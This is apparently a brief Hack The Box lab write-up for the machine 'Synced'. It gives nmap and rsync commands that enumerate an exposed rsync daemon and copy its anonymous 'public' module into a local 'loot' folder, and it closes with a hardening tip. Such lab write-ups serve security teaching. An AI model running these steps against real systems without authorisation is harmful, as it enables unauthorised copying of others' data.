# Synced

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 0) |
| **OS** | Linux |
| **Difficulty** | Very Easy |
| **Techniques** | Exposed rsync |

## Overview
A host exposing an rsync daemon with an anonymous module.

## Enumeration
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
# 873/tcp open  rsync
rsync -av --list-only rsync://<TARGET_IP>/     # list modules
```

## Exploitation
```bash
rsync -av rsync://<TARGET_IP>/public ./loot
```
Pulled the anonymous `public` module.

## Key Takeaway
Require authentication on rsync modules and restrict access by host.
